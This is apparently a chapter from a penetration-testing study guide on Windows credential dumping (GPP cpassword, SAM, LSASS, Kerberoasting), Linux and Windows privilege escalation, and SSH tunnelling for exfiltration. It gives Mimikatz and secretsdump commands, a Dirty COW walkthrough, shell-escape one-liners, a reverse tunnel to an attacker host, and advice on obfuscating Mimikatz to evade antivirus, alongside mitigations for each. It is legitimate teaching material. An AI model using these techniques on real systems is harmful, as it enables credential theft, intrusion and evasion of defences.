Group Policy Preferences (GPP) was introduced back in Windows Server 2008 and allows domain administrators to create domain policies to automate tedious tasks, such as changing the local Administrator account password on the host operating system. Each policy is created with an encrypted password embedded within the policy. Policies are stored in SYSVOL, which contains logon scripts, Group Policy data, and other domain-wide data that is viewable by any user who is a member of the domain. All was well until the Advanced Encryption Standard (AES) private key used to decrypt the passwords was published on the Microsoft Developer Network (MSDN) prior to 2012.

Since domain users have access to SYSVOL, any user can recover the XML policy files and decrypt the "cpassword" value, which is the field that contains the AES-encrypted GPP password. This provides a trivial way of escalating privileges on the domain. The following illustration shows the contents of the Groups.xml GPP file, which is configured to change the local Administrator password for domain clients.

You can decrypt the GPP CPassword value offline using various tools and scripts available on the Internet, such as the Get-DecryptedCpassword PowerShell function in the PowerSploit tool kit (we will talk more about that tool kit later on in the chapter). Another way is to use the post/windows/gather/credentials/gpp post-execution module in Metasploit to obtain and decrypt the CPassword value from the XML policy file in SYSVOL.

Microsoft suggests the best way to mitigate the CPassword privilege escalation vulnerability is to install the supplied patches for your operating system, which will prevent new credentials from being added to GPP, and to delete the existing GPP XML files in SYSVOL that contain passwords. The MS15-025 bulletin was assigned to this vulnerability and affects legacy versions of Windows up to Windows 2012 R2.

Windows: Security Accounts Manager

The Security Accounts Manager (SAM) database file contains local account settings and password hashes for the host. You can use the net user command at the Windows command prompt to list the local user accounts. You can retrieve the contents of the SAM file using specific in-memory techniques, which are automated using the following tools:

• SamDump2

• LaZagna

• secretsdump

• pwdumpx.exe

• gsecdump

• Mimikatz

The SAM file is located in C:\Windows\System32\config, but is locked against copying while the operating system is booted. You would have to use tools such as ninjacopy or volume shadow copy (VSS) to copy these programmatically. However, the contents are available in the local registry. The Windows registry is a hierarchical database that holds low-level configuration settings for the kernel, device drivers, services, etc. Administrators can use the regedit command to bring up the registry editor graphical user interface and make changes to registry entries as necessary. To manually extract the local hashes from the HKEY\_LOCAL\_MACHINE (HKLM registry hive), you will need the registry contents for the SAM and SYSTEM objects. You will need SYSTEM-level privileges to extract these registry entries. From the command prompt, you can use the reg command utility to copy the required objects to files on the file system.

Using a Meterpreter shell, you can download the files to your local Kali host for offline processing. Both files are required to do offline extraction of the hashes from the database for the local system.

The impacket-secretsdump command in Kali (i.e., alias for secretsdump.py) can be used to retrieve dump secrets from remote targets, without the need to install an agent or any type of persistence on the host. If you know the password of a local or domain-level administrator, you can execute the command impacket-secretsdump [user]:[pass]@[ip address] to pull all of the secrets remotely. You can also use the command and pass in the SAM and SYSTEM registry objects as command options to extract the local hashes (lmhash:nthash).

Mimikatz (ATT&CK ID: S0002) is a post-exploitation tool written in C by Benjamin Delpy (https://github.com/gentilkiwi/mimikatz) that can assist with obtaining plaintext Windows account logins and passwords during pentest engagements. The tool offers many features other than credential dumping, including account manipulation. We will cover some of these features, like the ones that can be used for lateral movement, later on in this chapter. Using a Meterpreter shell with system privileges, you can migrate to a 64-bit process if necessary, verify some system information, and load the Mimikatz module.

TIP Mimikatz comes in 32-bit and 64-bit versions. If you used a 32-bit process to exploit your target, Mimikatz will load the 32-bit version of the module. The issue is that some of the credential extraction features will require a 64-bit process. To help prevent this from happening, use the migrate command within your Meterpreter shell to migrate to a 64-bit process. To see a list of 64-bit processes, use the ps Meterpreter command to list running processes and locate a process to migrate to (e.g., wininit.exe).

Once the module has been successfully loaded, you can invoke Mimikatz commands from within the Meterpreter shell using mimikatz\_command. You can execute mimikatz\_command -h to see a list of command options, or use help mimikatz from the Meterpreter shell, which provides a list of built-in Mimikatz commands, to extract credentials. Among the arguments you pass to the Mimikatz command are functions (modules). To see a list of modules, execute mimikatz\_command -f foo:: at the Meterpreter shell, or any other made-up function that doesn't actually exist. To see options for the samdump module, you can use mimikatz\_command -f samdump::. To dump the list of local hashes from the SAM database, execute the following command: mimikatz\_command -f samdump::hashes.

NOTE Running Mimikatz in memory rather than on disk has its benefits, such as antivirus evasion. You can also use some trivial encoding or obfuscation techniques, like updating the Invoke-Mimikatz.ps1 command from the PowerSploit framework until it can no longer be detected by antivirus signatures, as shown in the "How to Bypass Anti-Virus to Run Mimikatz" article from https://www.blackhillsinfosec.com. Some antivirus software products may also be configured to consider Mimikatz as a potentially unwanted program (PUP) and will not actually perceive this as malicious software. Antivirus programs should be configured to alert and/or quarantine when they detect this type of software. Other mitigation techniques would be using some type of application whitelisting software installed, like AppLocker, or software restriction policies to prohibit the execution of unsigned programs.

Windows: Local Security Authority

The purpose of Local Security Authority (LSA) in Windows is to manage a systems security policy, enabling users to log in, auditing, and storing sensitive data, such as service account passwords. The LSA secrets are stored in the Windows registry key called HKLM\Security\Policy\Secrets. Every local or domain account that logs in to the host will have the credentials recorded in the Secrets registry key. If auto-login is enabled for the account (e.g., service account), the account information will be stored in the registry as well. The contents of the key are not accessible using the regedit command; however, you can also use Mimikatz to extract the LSA secrets from the local host.

The Local Security Authority Subsystem Service (LSASS) is used to store credentials in memory after a user successfully logs in to a system. The credentials may be an NT LAN Manager (NTLM) password hash, LM password hash, or even a cleartext password. This helps make credential sharing between trusted applications efficient and not require the user to enter a user and password every time authentication is required. The Security Support Provider (SSP) is a dynamic linked library (DLL) that makes one or more security packages accessible to applications. The Security Support Provider Interface (SSPI) operates as an interface to SSPs and helps facilitate access to the stored credentials.

Some of the SSPs documented within the MITRE ATT&CK matrix that are allowed to access the subsystem are

• Msv Authentication package: interactive logons, batch logons, and service logons

• Wdigest The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges

• TSPkg Web service security package

• Kerberos Preferred for mutual client-server domain authentication in Windows

• CredSSP Provides single sign-on (SSO) and network-level authentication for Remote Desktop Services

You can extract the LSASS process memory using the sekurlsa::logonPasswords option when executing Mimikatz from the Windows command terminal.

Service Principal Names and Kerberoasting

Kerberos is a network authentication protocol that leverages a ticketing system to allow hosts and users operating over the network to prove their identity to one another in a secure fashion. This helps mitigate against attackers eavesdropping and conducting replay attacks using Kerberos protocol messages. The Key Distribution Center (KDC) holds all of the secret keys. When a client successfully authenticates using domain credentials, the ticket-granting ticket (TGT) server will send back a credential that the user can use for authenticating to other trusted computers and applications within the domain, as shown in Figure 9-5. Each ticket has two lifetimes: a ticket lifetime and a renewable lifetime. At any point, a new ticket can be requested and the KDC will generate a new ticket if the renewable lifetime has not expired. If the ticket has expired, the KDC will decline the request, at which point the user will be required to reauthenticate.

![](RackMultipart20240405-1-nwk5q_html_1eb6d5d61f912036.png)

Figure 9-5 Kerberos configuration

A service principal name (SPN) is unique and is used to identify each instance of a Windows service. In Windows, Kerberos requires that SPNs be associated with at least one service logon account (i.e., the account that runs the service). Kerberos uses the SPN to determine which service account hash to use in order to encrypt the service ticket. Active Directory stores two types of SPNs: host-based, which are randomized by default and linked to a computer within the domain, and arbitrary, which are sometimes linked to a domain user account. During a pentest, if you are able to compromise a TGT, you may be able to request one or more Kerberos ticket-granting service (TGS) service tickets from a domain controller for any host or arbitrary SPN. If the arbitrary SPN is tied to a domain user account, the NTLM hash of that user's account plaintext password was used to create the service ticket, thus allowing you to compromise a valid domain user hash and afford the opportunity for offline password cracking, using your password cracking utility. This attack is known as Kerberoasting (ATT&CK ID: T1208).

There are numerous tools for performing the various parts of a Kerberoasting attack. Rubeus (https://github.com/GhostPack/Rubeus), Mimikatz, and parts of the Empire framework all apply. The Empire framework contains the Invoke-Kerberoast PowerShell script. Mimikatz also has the ability to export the cached TGS from memory using kerberos::list /export into .kirbi files. With these, you can use a conversion utility to put the hashes into a format John the Ripper (JTR) can understand, or use the utilities found at https://github.com/nidem/kerberoast.

NOTE Empire is a pure PowerShell post-exploitation agent (https://powershellempire.com) that can assist with lateral movement activities and maintaining persistence. While it is no longer maintained or supported, the project has integrations with Mimikatz and PowerView that are still useful for attacking Windows environments.

Windows: Unattended Installation

Windows unattended installations are processed using an answer file during initial setup. You can use the answer file to automate tasks during installation, such as configure a desktop background, set up local auditing, configure drive partitions, or set the local administrator account password. The answer file is created using the Windows System Image Manager, which is a part of the Windows Assessment and Deployment Kit (ADK) and can be downloaded for free from https://www.microsoft.com.

The Image Manager will allow you to save the unattended.xml file to your computer and allow you to repackage the installation image (used to install Windows) with the new answer file. During a pentest, you may come across answer files on network file shares or local administrator workstations that could aid in further exploitation of the environment. If an attacker comes across these files, along with local administrator access to the host that generates the images, the attacker could update the answer file to create a new local account or service on the system and repackage the installation file so that when the image is used in the future, new systems can be remotely compromised.

Privilege Escalation

User-level privileges will only get you so far during an engagement. You're limited to whatever data that user can access, and you can only perform tasks that user is allowed to do. Privilege escalation is the result of obtaining additional permissions on a system or network. In this section, we'll talk about privilege escalation based on specific operating system contexts.

You may see references to two kinds of privilege escalation: vertical privilege escalation and horizontal privilege escalation. Vertical privilege escalation refers to the process of gaining higher-level permissions, such as using the weakness in an installed application to gain SYSTEM-level privileges in Windows, or exploiting a configuration weakness in a setuid command that is owned by root. Horizontal privilege escalation refers to the process of gaining additional access to resources beyond your existing user context, such as gaining access to the home directory of another user or gaining access that enables you to reach a different network segment than is intended for you to access based on the network design.

NOTE The kernel is the heart and core of the operating system. It manages all operations for the computer, most importantly the central processing unit (CPU) functions, allocating and deallocating memory space for software, and managing device drivers. There are two types of operating system kernels: a monolithic kernel (e.g., Linux- and UNIX-based operating systems) and a microkernel (e.g., Windows and macOS). In a monolithic kernel, the processes are hosted in the kernel address space (i.e., privileged mode) and applications communicate with the kernel using system calls, whereas with a microkernel, the kernel is broken down into separate processes that are hosted in both kernel space and user space (i.e., less privileged), and processes can communicate with each other using interprocess communication (IPC) messages. You can learn more about these types of kernels by searching through https://docs.microsoft.com or https://www.kernel.org.

Linux Privilege Escalation

For this book, we'll focus on a survey of common privilege escalation techniques within the Linux OS. However, be aware that there are numerous techniques that can be used above and beyond what we will cover here. In this section, we'll talk about kernel-level exploits, SUID and SGUID programs, weaknesses with sudo, and sticky bits.

Kernel-level exploits provide a means to escalate from user to root privileges and can assist in taking over full control of a host. To research known vulnerabilities for the OS, you can use the operating system release details and kernel version to search for known common vulnerabilities and exposures (CVEs) related to the operating system. Or, if you used Metasploit with a Meterpreter payload, you can run the local\_exploit\_suggester post-execution module, as shown in Figures 9-6 and 9-7. The local exploit suggester, or lester for short, will scan the target system for vulnerabilities, using the local exploit checks in Metasploit. This could save you time and hassle doing manual research and analysis yourself when there may already be a privilege escalation exploit in the framework that you could use.

Figure 9-6 Local exploit suggester against Linux

Figure 9-7 Local exploit suggester against Windows

TIP It is recommended to enable the SHOWDESCRIPTION=true option when running the local\_exploit\_suggester module. This will provide a detailed description of the exploit in case you are unfamiliar with what the exploit is actually doing.

Linux Kernel-Level Exploits

An example of a kernel-level exploit is the Dirty COW vulnerability reported in 2016. Dirty COW (CVE-2016-5195) (https://dirtycow.ninja) is a privilege escalation vulnerability in the Linux kernel that takes advantage of a race condition in the way the kernel's memory subsystem handles the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could exploit this weakness to gain write access to otherwise read-only memory mappings and gain higher privileges on the operating system. This particular bug has been around since 2007, starting with kernel version 2.6.22. Let's take a closer look at the vulnerability and execute proof-of-concept code to demonstrate exploitation. Follow along with this exercise as we exploit the Dirty COW vulnerability against a local host to escalate privileges to root. You will need a suitable Linux operating system vulnerable to Dirty COW. You can find a list of vulnerable operating systems by searching the CVE Details website using the specific CVE number. I will be using CentOS 6.4 (http://archive.kernel.org/centos-vault/6.4/isos/x86\_64).

NOTE A race condition is a type of behavior where the output is dependent on the sequence or timing of other uncontrollable events. It can become a vulnerability when events do not happen in the order the programmer intended.

1. On the vulnerable host, install the wget and gcc packages and the necessary software dependencies so you can download and compile the exploit for your specific architecture:

# yum -y install wget gcc dos2unix

2. Create a local unprivileged user account to run the exploit as:

3. For this exercise, we will be using the PTRACE\_POKEDATA race condition privilege escalation (/etc/passwd method) proof-of-concept (POC) code. This exploit will automatically generate a new password line in the local /etc/passwd file. The user will be prompted for the new password when the binary is run. The original /etc/passwd file is backed up to the /tmp directory. Log in to the local operating system as the "user" account and download the Dirty COW exploit code from the Exploit Database website:

4. The PoC is written in C and will create the new privileged user account called "firefart." To change this, you can use your favorite text editor and update lines 47 and 131 to create the user "newroot":

Or you can use the stream editor command to do a find and replace of the original text in the source file and replace it with "newroot":

$ sed -i 's/firefart/newroot/g' dirtycow.c

5. Use the GNU compiler (gcc) to compile the exploit for your architecture. The -pthread flag will enable threading in the program, and -lcrypt will encrypt the plaintext password for the new user in the password file. Sometimes PoC code will have instructions inside the source code that compiler flags use in order to assist you with how to best compile the executable. If compilation was successful, you will be left with a binary executable called dirtycow:

$ gcc -pthread dirtycow.c -o dirtycow -lcrypt

6. If you are running the vulnerable host in a virtual machine, now would be a good time to take a snapshot for good measure. Execute dirtycow and, when prompted, provide a new password for the new account. Then, try and su to the new account to escalate privileges, shown next.

Once you have escalated privileges, you can review the contents of the /etc/passwd file and see that the new account was added to replace the original "root" account. If you don't see any output, press ctrl-c and see if the new user is in the file. Afterwards, ensure you move the /tmp/passwd.bak file back to /etc/passwd to prevent future local authentication errors. If you do run into some errors, you can always revert to the latest snapshot and try again.

Finding SUID/SGID Executables

Typically, when an application is executed, it runs in the current user's context, regardless of application ownership. Sometimes in Linux or macOS, there is a need for an application to execute in an elevated context (e.g., root privileges) to function properly, but the user executing the program doesn't need the elevated privileges. The setuid and setgid bit permission can be applied to files on the operating system, using chmod 4777 [file], chmod u+s [file], or chmod g+s [file] so that when executed, the process runs with the privileges of the user or group that owns the file. The setuid and setgid technique (ID: T1166) from the MITRE ATT&CK matrix states that applications with known vulnerabilities, or known shell escape, should not have the special bit applied to reduce the possible damage should the application become compromised. In Chapter 3, we discussed a privilege escalation example using a shell escape technique in an older version of nmap, which provided an interactive shell feature. To locate all setuid executable files on a Linux/UNIX host, you could execute the following command syntax at a terminal window:

find / -perm –u=s –type f –exec ls –al {} \; 2\>/dev/null

This would traverse through the file systems, starting with the root partition, and look for files that have the setuid bit applied that your account has read access to. Once the file is located, the –exec option executes a long listing format with ls –al for each file that is returned. STDERR (standard error) is discarded and redirected to /dev/null. To look for files with the setgid bit applied, swap out the –u flag (represents the owner of the file) with a –g flag (represents the group owner). If you wanted to just print the path of a setuid file that was owned by root, you could specify the –user root option in the command syntax:

find / -user root –perm -4000 –print 2\>/dev/null

THE PURPOSE OF THE STICKY BIT

A sticky bit is a permission bit, like a setuid and setgid bit, but is set on a directory that allows only the owner of the file within the directory to delete or rename the file. An example of a directory with the sticky bit set would be /tmp in Linux and macOS. Here, any user can write to the directory, but only that user has the permission to remove the file. You can create a directory with a sticky bit as follows:

The "T" in the "test" directory takes the place of the execution permission bit for "everyone." The "t" bit allows everyone to write and execute inside the directory. Sticky bits help mitigate the possibility of a malicious user from removing files within a directory with another trusted user account.

Exploiting sudo Configurations

Sudo is a program for UNIX-like operating systems that allows administrators to delegate authority within the operating system to lower privileged user accounts. The /etc/sudoers file is the security policy that specifies which command(s) the user can execute as another user, which is typically either a group account with higher privileges or the superuser account (i.e., root). In some cases, the user with sudo privileges may not have to provide a password to execute commands under sudo, which could help make things a little easier during a pentest, should an account with sudo privileges become compromised. Let's take a look at the example /etc/sudoers file within Kali Linux, as shown in Figure 9-8.

Figure 9-8 Example sudoers file

Line 20 specifies that the "root" user can run ALL commands against the operating system. Line 23 specifies that any user listed in the "sudo" group (in /etc/groups) is permitted to execute ALL commands as root after specifying a password. If I created a user named "user1" and added the user to the "sudo" group (useradd -G sudo -s /bin/bash user1), the user would be able to execute all commands and be prompted for the sudo password, which is the user1 account password.

TIP When editing the /etc/sudoers file, it is recommended to use the command visudo to edit the file in a safe fashion. It will lock the sudoers file against multiple simultaneous edits and provide some basic sanity checks, as well as check for parse errors.

If line 23 in the /etc/sudoers file had a line that looked like this:

user1 ALL=(ALL) NOPASSWD: ALL

the user would not be prompted for a password. The MITRE ATT&CK ID: T1169 references insecure sudo configurations that do not require sudo passwords. This type of sudo configuration could be helpful during a pentest if you were to compromise an account that had access to sudo privileges and were not required to provide a password to elevate privileges. For instance, imagine if you compromised a local account called "logger" and that user had sudo privileges to execute the script /usr/local/move\_logs.sh, but that user also has write privileges to the script. At this point, the pentester could get creative and append some bash code to the script to help elevate privileges, such as executing a Meterpreter payload generated through msfvenom, or simply adding /bin/bash –i to the end of the script to execute an interactive bash shell with root privileges post–script execution. However, regardless if sudo is configured to prompt the user for a password, the "timestamp\_timeout" configuration setting tracks the amount of time in minutes between instances of sudo before reprompting the user for the sudo password (the default is 15 minutes). This is due to sudo's ability to cache credentials for a designated period of time, otherwise known as sudo caching. Refer to the MITRE ATT&CK ID: T1206 for further information. The sudo cache is only good for the terminal session the sudo command was executed in; however, run the following command if you want sudo to span across all TTY sessions (e.g., console logins, remote logins, etc.):

echo 'Defaults !tty\_tickets' \>\> /etc/sudoers

You can test the new setting by opening a terminal window as the unprivileged user and executing sudo /bin/bash, then enter the password when prompted, then open another terminal window and execute sudo cat /etc/shadow, and you should not be prompted for a password. Organizations that use insecure sudo configurations can create a dangerous situation that could aid attackers by further compromising the local host. Privileged users should be required to specify a sudo password and sudo caching should be disabled or restricted, where applicable.

TIP If you want to force the user to enter the sudo password each time sudo is executed, you can add the following line to the sudoers file: Defaults timestamp\_timeout=0.

Upgrading a Restrictive Shell

One security measure that can thwart attackers is a restricted shell. Forcing an account into a shell that has limited abilities is another way to assert the principle of least privilege. Restricted shells may limit the commands that can be run, what parts of the file system can be accessed, or even redefine what operators and escape characters work. So, when you compromise an account, you might need to figure out how to escape from these shells in order to get better access in pursuit of your goals.

If ls is available, you can attempt to list common parts of the operating system, like /usr/bin to see what tools you have at your disposal. If it's not, you can try to use echo /usr/bin/\* to show the directory contents instead. Then many of the concepts for SUID/SGID escalation might apply.

Editors and file pagers are popular mechanisms for shell elevation, if they are available. Many of these allow you to escape to a shell. For example, in vi and vim, you may be able to issue the command :!/bin/sh or :shell to escape into a shell from the editor. In the pager less, the command would be !/bin/sh or whatever is your shell of choice. This shell will typically be less restricted.

Linux also typically has one or more programming languages installed, such as Python or Perl. If these are accessible, you may be able to write a quick script to get a shell. For Python, import os; os.system("/bin/sh") may work. In Perl, you may try something like exec "/bin/sh"; instead.

Other built-in utilities, such as awk and find, may help you break out of a shell when other options are unavailable. You can even use awk to spawn a reverse shell, if you're clever. But you can use awk 'BEGIN {system("/bin/sh")}' to attempt to elevate out of a restricted shell. The equivalent using find would be find / -name fakename -exec /bin/sh \;

Windows Privilege Escalation

There are other ways to escalate privileges than acquiring credentials. As with Linux, there are more methods than we can cover within the scope of a single chapter. In this section, we'll focus on examples using kernel exploitation, token manipulation, execution flow hijacking, and process injection.

Kernel Exploitation

In this exercise, we'll explore how to exploit a local privilege escalation vulnerability (CVE-2010-3338) against a vulnerable Windows 2008 x64 SP2 server. We'll start with getting local access to the system. Then we'll explore how to find and use the exploit to gain privileged access.

Using psexec Module The Metasploit Meterpreter shell is an effective way of interacting with a target environment, as it runs entirely in memory and leaves little to no trace after disconnecting. To get a Meterpreter shell on a Windows host when you have admin privileges, you can use the windows/smb/psexec module to execute an arbitrary Meterpreter payload (e.g., reverse shell to call back to you or a bind shell that you connect to over a specific port) on an open share, writable by the admin account. If the compromised account is not a member of the local administrators group or has elevated permissions on the domain, you will not be able to use psexec to remotely log in and interact with the target.

Using msfvenom and smbclient Another option is to use msfvenom in Kali to generate a payload, copy the payload over to the target using the smbclient command, and then execute it to establish a Meterpreter session back to your multi/handler.

1. Generate the payload using msfvenom from Kali:

2. Copy the payload over to the target using the compromised user credentials:

3. From the target console, open the share folder and double-click the payload:

4. Capture the callback using a Metasploit multi/handler module configured to use the same LHOST, LPORT, and payload option generated from msfvenom:

Searching for Missing Patches with enum\_patches Another way to search for local privilege escalation vulnerabilities against the host is to use the windows/gather/enum\_patches Metasploit module, as shown in Figure 9-9. This is a post-execution module you run against an active Metasploit session to provide a list of missing Knowledge Base (KB) articles (patches) and their associated Microsoft Bulletin, where applicable.

Figure 9-9 Enumerating patches with Metasploit

Searching for Missing Patches with WMIC Similar to the enum\_patches Metasploit module, the Windows Management Instrumentation Command line (WMIC) utility provides a command-line interface for interacting with the Windows operating system. You can use the WMIC utility from the command prompt to search for patches and their installation dates on the target operating system, as shown in Figure 9-10. The data returned from the WMI query can be correlated against the missing patches enumerated from Metasploit:

Figure 9-10 Discover missing patches with WMIC

c:\Users\user\> wmic qfe get Caption,Description,HotFixID,InstalledOn

TIP The Windows Management Instrumentation (WMI) is a component of the Windows operating system that facilitates the local and remote management of data and operations. The WMI is useful for automating administrative tasks through WMI scripts or applications. You can find out more through the https://docs.microsoft.com website.

Exploiting schelevator CVE-2010-3338 is a local privilege escalation vulnerability that allows local users in vulnerable Windows operating system versions to gain privileges via scheduled tasks. When processing task files, the Windows Task Scheduler relies on a CRC-32 checksum in order to ensure that a file has not been tampered with. In default Windows configurations, local users can read and write task files that they create. Since CRC-32 is not a cryptographic algorithm, users can modify a new or existing task file to create a potential hash collision and execute arbitrary commands with SYSTEM privileges. Figure 9-11 demonstrates this vulnerability, using the windows/local/ms10\_092\_schelevator Metasploit module against a user Meterpreter session on a Windows 2008 x64 SP2 server.

Figure 9-11 MS10\_092 schelevator exploit

The exploit module will create an initial task as the user account (since we don't have SYSTEM-level access yet), read in the contents of the task, convert it to Unicode format, then record the CRC-32 hash value so it can assign it later on after the task has been modified. Then, the exploit will convert the file contents from Unicode and update the XML tags within the task file to run the payload with SYSTEM-level privileges, since the task was originally created with user-level privileges. Then, the exploit converts the file contents back to Unicode, fixes the CRC-32 checksum so that the task matches the original recorded hash value (CRC-32 collision), and executes the task using the Task Scheduler. The vulnerability is not that the user can create the task, but that there is a flaw in the trusted integrity mechanism (CRC-32 checksum) that is used to validate that the task has not been tampered with or altered in any way. A user account should not be able to modify the contents of a task to enable it to run with higher privileges.

DLL Search Order Hijacking

Windows DLLs contain code and other data used by native Windows applications in order to function properly. When software is installed on Windows, the program will include a bundle of required DLLs to be installed to the operating system, as well as rely on some built-in DLLs provided by the operating system. When an application loads, it will use a common method to look for all required DLLs to load into the program. DLLs are not called using a fully qualified path (i.e., where the DLL should reside on the operating system). Thus, if the DLL doesn't exist or if it is implemented in an insecure way (such as a directory path with weak permissions) and an attacker gains control of one of the directories on the DLL search path, it could be possible to elevate privileges by forcing the application to load and execute a malicious DLL. The following order is used by a program when searching for a DLL if SafeDllSearchMode is enabled:

1. Program installation directory

2. Windows system directory (C:\Windows\System32)

3. Windows 16-bit system directory (C:\Windows\System)

4. The Windows directory (C:\Windows)

5. The current working directory

6. Directories in the system PATH environment variable

7. Directories in the user PATH environment variable

To help look for DLL search order hijacking (ATT&CK ID: T1038) vulnerabilities in local programs, you can download one of the Windows SysInternals utilities called Process Monitor (https://docs.microsoft.com/en-us/sysinternals). The Process Monitor application (procmon) is used to monitor processes running on the local system. You can use the tool to investigate in real time running processes with missing DLL files, as shown under the "DLL Hijacking" article posted to https://pentestlab.blog. To exploit a DLL hijacking vulnerability, first check to see if the DLL exists in any of the other search paths on disk. If the DLL doesn't exist, you can place a malicious copy of a DLL within the execution path of a directory you have write access to (e.g., use msfvenom to generate a DLL with a Meterpreter reverse\_tcp shell payload). When the process is restarted, the DLL should be loaded, and the malicious process should execute the payload with the privileges of the running process. If the DLL does exist somewhere else on disk in one of the search paths, see if you can write a location with a higher priority (i.e., installation directory). Using procmon, you can apply specific filters, such as looking for the applications running with SYSTEM-level privileges and missing DLL files.

EXAM TIP You may see scenario-based questions on the exam asking if you can determine which processes could be targeted for privilege escalation during an engagement, such as those processes running with SYSTEM-level privileges.

Unquoted Service Paths

The Windows registry is responsible for recording execution paths for services created on the Windows operating system. Administrators can create new services using the sc.exe command utility baked into the Windows system. Figure 9-12 provides an example of how to use the sc.exe command to create a service name "vulnerablesvc" that points to the vulnerable.exe executable in the "shared commands" folder.

Figure 9-12 Create service vulnerablesvc

When a new service is created on the local operating system, a unique key is created in the registry. These keys are located in the following Windows registry location: HKLM\SYSTEM\CurrentControlSet\services, as shown in Figure 9-13.

Figure 9-13 Unquoted service path in the registry

Lower-privileged users will not be able to modify the service; however, users can still search for services. We can use the wmic command to look for services with unquoted executable paths. Figure 9-14 shows vulnerablesvc with a display name of UnquotedServicePath, which could be a likely target to attack for privilege escalation.

Figure 9-14 Search for unquoted service paths using the wmic command.

Services created with administrator privileges will run as the SYSTEM account, unless it is configured to use a different service account or username/password combination. When Windows attempts to run the service, it will use the following path to run the first executable that it can find:

1. C:\Program.exe

2. C:\Program Files.exe

3. C:\Program Files (x86)\Shared.exe

4. C:\Program Files (x86)\Shared Services\shared.exe

5. C:\Program Files (x86)\Shared Services\shared commands\vulnerable.exe

If we have write access to any of those folders prior to the final execution path, we can add our own malicious executable in the service path to force our program to load instead of the original program executable. The vulnerability is a result of the "CreateProcess" function in Windows operating systems, as described on the https://docs.microsoft.com website. Now, we can use the icacls command to see if we have write access to the Shared Services folder. Figure 9-15 shows that we have full permission over the folder.

Figure 9-15 Check folder permissions.

TIP Another tool that you can use to check specific users or group permissions to files, directories, registry keys, global objects, and Windows services is the Windows sysinternals command, accesschk.exe. You can find more information from the https://docs.microsoft.com/en-us/sysinternals website.

We just need to generate a payload to use in order to get a call back with system privileges. You can use msfvenom to generate a meterpreter\_reverse\_tcp payload called shared.exe, then put the executable in the C:\Program Files (x86)\Shared Services folder, as shown in Figure 9-16, since the user has write access.

Figure 9-16 Payload stored in the Shared Services folder

Once the payload has been copied over, you need to configure multi/handler so you can catch the SYSTEM-level shell once the service is started or restarted, as shown in Figure 9-17.

Figure 9-17 Starting the multi/handler

Now that everything seems to be in place, you just need to restart or start this service, if it has not already been started. However, lower-privileged accounts or accounts without permission to start the vulnerable service will get an access denied error if the account tries to start the service, as shown in Figure 9-18.

Figure 9-18 Failed attempt to start service in Task Manager

An alternative would be to reboot the system, wait until the next reboot, or social-engineer the administrator to restart the service, which is unlikely unless you are a very persuasive and believable person. Once the service kicks off, it will now read our "shared.exe" executable in the 4 option of the service path and execute that instead of the vulnerable.exe application, which is the intended program. Figure 9-19 shows the service calling home and giving me a shell with SYSTEM-level privileges.

Figure 9-19 Get SYSTEM privileges

Eventually, the service on the target will time out. Before that happens (roughly less than 20 seconds), you will want to migrate to another process, as shown in Figure 9-20. Previously in the chapter, I mentioned the wininit.exe process was an optional service to migrate to. Once you migrate, your shell will be stable, but the original process will die off once the service errors out. If you run the post/windows/manage/migrate module in your Meterpreter shell without specifying a process to migrate to, the module will automatically spawn a new process and migrate to it. In short, unquoted service paths are vulnerabilities that can lay dormant on the operating system, waiting to be exploited. When administrators intermingle processes and applications with lower-privileged user accounts, it could cause a situation like we just discussed and present a recipe for disaster.

Figure 9-20 Migrate processes with Metasploit

To mitigate against these types of vulnerabilities, the MITRE ATT&CK page suggests that organizations eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and shortcuts by surrounding path variables with quotation marks, where applicable. It will also be important for administrators to be aware of the search order that Windows uses for executing or loading binaries and to clean up old registry keys after uninstalling software applications to eliminate the issue of registry keys not being associated with a legitimate binary. In some cases, it may be possible to abuse writable services that run as SYSTEM or elevated privileges. This is due to incorrect permissions set by the administrator for a service, or the user account has elevated permissions in the directory where the binary is executed from. The local service configuration information in the registry could be modified in order to change the binary executable path and point to a malicious program instead. You can find out more about service registry permission weaknesses (ID: T1058) from the MITRE ATT&CK website.

Covert Channels and Data Exfiltration

Exfiltration is the process of moving data out of the environment you have compromised. You can exfiltrate data over any communication channel, including HTTP, HTTPS, or using any other port or protocol that is allowed through a firewall and proxy. The most popular way to get data out of a system is via the established command and control channel (such as a tunnel). SSH is a popular protocol for tunneling, but let's talk about how shells and exfiltration work.

SSH Tunneling

SSH tunneling is used to forward application ports from an SSH client to an SSH server. This is a useful way to securely transfer files and connect to internal network services (like NFS or HTTP/S) that are listening on nonroutable networks. We'll walk through the types of SSH tunnels you can use and talk about how to incorporate the use of Proxychains.

Some targets sit behind firewalls that use network address translation (NAT) to hide the private network (nonroutable network) from the public-facing network (i.e., Internet). SSH remote forwarding (i.e., -R SSH command flag) is a technique that can be used to establish a reverse tunnel from a firewalled host to a host outside the firewall, as shown in Figure 9-21. A reverse tunnel means you're getting the target to call back to you. For instance, let's assume your destination IPv4 address that sits behind the NAT firewall is 192.168.1.50 (SSH client) and your attack box (SSH server) is on the Internet with a public IPv4 address.

Figure 9-21 SSH reverse tunnel

You can use the ssh command to remotely connect from the client to the source (we will use an example fully qualified domain name [FQDN]) using the following command:

Example:

ssh -f -N -T -R 2222:localhost:22 attackbox.example.com

Options:

• -f Background the SSH process after authenticating

• -N Tell SSH that you want to connect but not run any commands

• -T Disables pseudo-TTY allocation since you are not trying to create a remote shell

This will tell the firewalled client to establish a remote exit point with attackbox.example.com. Any connection made to port 2222/tcp from attackbox.example.com will actually reach the firewalled client, using the SSH reverse tunnel. To SSH over the remote exit point, simply point the ssh command from the attack.example.com server towards localhost on port 2222/tcp.

Example:

ssh localhost -p 2222

Option:

• -p Remote exit port used to tunnel back to internal SSH client

TIP If you wanted to enable X11 forwarding of applications from the server back to the SSH client, you can use the -X option. For instance, you can enable X11 forwarding during your SSH connection if you wanted to use the server's Firefox application to connect to navigate web-based hosts on the local network that it knows about.

Local forwarding (i.e., -L SSH command flag) allows a TCP port from the SSH client to be forwarded to the SSH server. This can help secure unencrypted protocols or access services that are only available from within the local network, such as NFS, HTTP, and MySQL Oracle. If you exploited a host behind the firewall and want to access an Apache web server that only allows connectivity from internal IPv4 addresses, you could use a local forwarding tunnel from the compromised host (SSH client) to your attackbox (SSH server). Once authenticated, you can browse to http://www.internal.web.org:8080 from the attack.example.org host, and your connection will go through the SSH forwarded tunnel (i.e., port 8080/tcp) and connect to the internal web server.

Example:

ssh -L 8080:www.internal.web.org:80 attackbox.example.org

